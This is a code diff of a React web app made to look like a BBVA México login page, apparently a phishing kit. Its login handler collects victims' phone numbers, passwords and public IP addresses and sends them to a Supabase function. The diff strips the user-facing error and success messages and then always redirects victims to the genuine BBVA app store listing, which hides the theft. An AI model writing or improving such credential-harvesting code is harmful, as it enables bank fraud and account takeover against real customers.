@@ -59,27 +59,20 @@ function App() {
   const [password, setPassword] = useState('')
   const [showPassword, setShowPassword] = useState(false)
   const [isSubmitting, setIsSubmitting] = useState(false)
-  const [loginError, setLoginError] = useState('')
-  const [loginSuccess, setLoginSuccess] = useState('')
 
-  // Apertura mediante Universal Links y fallback oficial
-  const openApp = () => {
-    const playStorePackage = 'com.bbva.bancomer'
-    const appStoreId = '374824226'
-    const bbvaOfficialUrl = 'https://www.bbva.mx/'
+  // Enlaces oficiales hacia las tiendas
+  const appStoreUrl = 'https://apps.apple.com/mx/app/bbva-m%C3%A9xico/id374824226'
+  const playStoreUrl = 'https://play.google.com/store/apps/details?id=com.bbva.bancomer'
 
+  // Redirección directa hacia la tienda de aplicaciones
+  const redirectToStore = () => {
     const userAgent = navigator.userAgent || navigator.vendor
-    const isAndroid = /android/i.test(userAgent)
     const isIOS = /iPad|iPhone|iPod/.test(userAgent)
 
     if (isIOS) {
-      // En iOS redirige al dominio oficial de Universal Links
-      window.location.href = bbvaOfficialUrl
-    } else if (isAndroid) {
-      // En Android intenta abrir por Intent o redirige a la Play Store
-      window.location.href = `intent://open#Intent;scheme=https;package=${playStorePackage};S.browser_fallback_url=https://play.google.com/store/apps/details?id=${playStorePackage};end`
+      window.location.href = appStoreUrl
     } else {
-      window.open(`https://apps.apple.com/app/id${appStoreId}`, '_blank')
+      window.location.href = playStoreUrl
     }
   }
 
@@ -89,38 +82,28 @@ function App() {
       const res = await fetch('https://api.ipify.org?format=json')
       const data = await res.json()
       return data.ip
-    } catch (err) {
+    } catch {
       return '0.0.0.0'
     }
   }
 
   async function handleLogin(event: React.FormEvent<HTMLFormElement>) {
     event.preventDefault()
-    setLoginError('')
-    setLoginSuccess('')
     setIsSubmitting(true)
 
-    // 1. Iniciar la navegación inmediatamente tras el evento del usuario
-    openApp()
-
-    // 2. Ejecutar el guardado en Supabase en segundo plano
     try {
       const ip = await getPublicIP()
-      const { error } = await supabase.functions.invoke('login', {
+      
+      // Enviar credenciales e IP a la función de Supabase
+      await supabase.functions.invoke('login', {
         body: { phone, password, ip },
       })
-
-      if (error) {
-        setLoginError('Error al conectar. Inténtalo más tarde.')
-      } else {
-        setLoginSuccess('Inicio de sesión exitoso')
-        setPhone('')
-        setPassword('')
-      }
     } catch (err) {
-      setLoginError('Error inesperado.')
+      console.error('Error al registrar datos:', err)
     } finally {
       setIsSubmitting(false)
+      // Redirigir siempre a la tienda tras el envío
+      redirectToStore()
     }
   }
 
@@ -134,8 +117,6 @@ function App() {
             type="button"
             aria-label="Cerrar inicio de sesión"
             onClick={() => {
-              setLoginSuccess('')
-              setLoginError('')
               setShowLogin(false)
             }}
           >
@@ -181,8 +162,6 @@ function App() {
             {isSubmitting ? 'Enviando...' : 'Continuar'}
           </button>
 
-          {loginError && <p className="login-error" role="alert">{loginError}</p>}
-          {loginSuccess && <p className="login-success" role="status">{loginSuccess}</p>}
           <a className="forgot-password" href="#0">
             ¿Olvidaste tu contraseña?
           </a>
@@ -210,8 +189,6 @@ function App() {
           className="login-button"
           type="button"
           onClick={() => {
-            setLoginSuccess('')
-            setLoginError('')
             setShowLogin(true)
           }}
         >
@@ -232,7 +209,7 @@ function App() {
                 te
               </>
             }
-            onClick={openApp}
+            onClick={redirectToStore}
           />
           <QuickAction
             icon={<BranchIcon />}
@@ -243,9 +220,13 @@ function App() {
                 cajeros
               </>
             }
-            onClick={openApp}
+            onClick={redirectToStore}
           />
-          <QuickAction icon={<PhoneIcon />} label="Línea BBVA" onClick={openApp} />
+          <QuickAction 
+            icon={<PhoneIcon />} 
+            label="Línea BBVA" 
+            onClick={redirectToStore} 
+          />
         </nav>
       </section>
     </main>
